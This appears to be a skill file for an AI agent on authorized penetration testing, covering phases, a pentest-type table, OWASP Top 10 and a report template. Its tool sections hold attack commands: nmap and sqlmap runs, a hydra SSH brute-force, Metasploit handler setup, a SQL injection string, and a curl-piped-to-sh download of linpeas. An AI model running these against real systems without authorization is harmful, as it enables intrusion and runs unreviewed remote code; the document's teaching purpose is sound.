---
name: penetration-testing
description: Manual and automated penetration testing. Use for conducting pentests, attack simulation, and system security assessment.
---

# Penetration Testing

> **Meta:** v1.0.0 | 06-04-2026

## Purpose

Skill for conducting penetration testing. Includes planning, information gathering, vulnerability exploitation, post-exploitation, and documenting results.

## When to Use

Use this skill:
- When conducting authorized pentest
- For attacker simulation
- When assessing critical system security
- For finding vulnerabilities missed by automated scanning
- When checking effectiveness of existing security controls
- For preparing stakeholder reports

## Methodology

### OSINT (Open Source Intelligence)

```
1. Passive information gathering:
   - Search engine research
   - Social media analysis
   - DNS record research
   - WHOIS queries

2. Active information gathering:
   - Port scanning
   - Service version identification
   - Web application scanning
   - Subdomain enumeration
```

### Pentest Phases

```
1. RECON → 2. SCANNING → 3. EXPLOITATION → 4. POST-EXPLOITATION → 5. DOCUMENTATION
```

## Pentest Types

| Type | Description | Duration |
|------|-------------|----------|
| Black Box | No system knowledge | 2-4 weeks |
| Grey Box | Partial knowledge | 1-2 weeks |
| White Box | Full code access | 1-2 weeks |
| Web Application | Web app only | 1-2 weeks |
| Network | Internal network | 1-2 weeks |
| Mobile | Mobile applications | 1-2 weeks |
| Social Engineering | Phishing, phone | 1-2 weeks |

## Tools

### Information Gathering

```bash
# Nmap - port scanning
nmap -sV -sC -p- -oA scan_results target.com

# Sublist3r - subdomain enumeration
sublist3r -d target.com -o subdomains.txt

# theHarvester - email gathering
theHarvester -d target.com -b all

# WhatWeb - technology identification
whatweb -a 3 target.com
```

### Web Testing

```bash
# OWASP ZAP
zap-baseline.py -t target.com

# SQLmap - SQL injection
sqlmap -u "http://target.com/vuln.php?id=1" --batch

# Burp Suite - comprehensive testing
# Use built-in tools
```

### Exploitation

```bash
# Metasploit Framework
msfconsole
use exploit/multi/handler
set RHOST target.com

# Password attacks
hydra -L users.txt -P passwords.txt target.com ssh

# John the Ripper
john --wordlist=passwords.txt hash.txt
```

### Post-Exploitation

```bash
# BloodHound - Active Directory analysis
bloodhound-python -d target.local -u user -p pass

# LinPEAS - Linux privilege escalation
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

## Vulnerability Categories

### OWASP Top 10 (2021)

| ID | Category | Testing |
|----|---------|---------|
| A01 | Broken Access Control | IDOR, Privilege escalation |
| A02 | Cryptographic Failures | Weak crypto, Data exposure |
| A03 | Injection | SQL, XSS, Command injection |
| A04 | Insecure Design | Business logic flaws |
| A05 | Security Misconfiguration | Default creds, Verbose errors |
| A06 | Vulnerable Components | Outdated libraries |
| A07 | Auth Failures | Weak passwords, Session management |
| A08 | Software Integrity | Insecure deserialization |
| A09 | Logging Failures | Missing logging, Log injection |
| A10 | SSRF | URL bypass, Cloud metadata |

## Report Template

```markdown
# Penetration Test Report

**Project:** [Project Name]
**Target:** [Target Systems]
**Date:** [Date]
**Tester:** [Name]

## Executive Summary
[Brief overview of findings]

## Scope
- In-scope: [Systems]
- Out-of-scope: [Systems]
- Rules of engagement: [Rules]

## Methodology
- Testing approach: [Black Box/Grey Box/White Box]
- Tools used: [List]

## Findings Summary

| ID | Title | Severity | Status |
|----|-------|----------|--------|
| 01 | SQL Injection | Critical | Verified |
| 02 | XSS | High | Verified |

## Detailed Findings

### Finding 01: SQL Injection

**Severity:** Critical
**CVSS:** 9.8
**URL:** http://target.com/search.php

**Description**
[Detailed description]

**Impact**
[Business and technical impact]

**Steps to Reproduce**
1. Navigate to http://target.com/search.php
2. Enter: `' OR '1'='1` in search field
3. Observe database error

**Remediation**
[Recommended fix with code example]

**Proof of Concept**
[Screenshot or request/response]
```

## Quality Criteria

- [ ] Written permission obtained
- [ ] Rules of engagement followed
- [ ] All phases documented
- [ ] False positives excluded
- [ ] POC reproducible
- [ ] Recommendations applicable
- [ ] Report understandable for non-technical audience

## Ethical Principles

- Only authorized testing
- Minimize system impact
- Data confidentiality
- Timely disclosure of results
- No malicious software
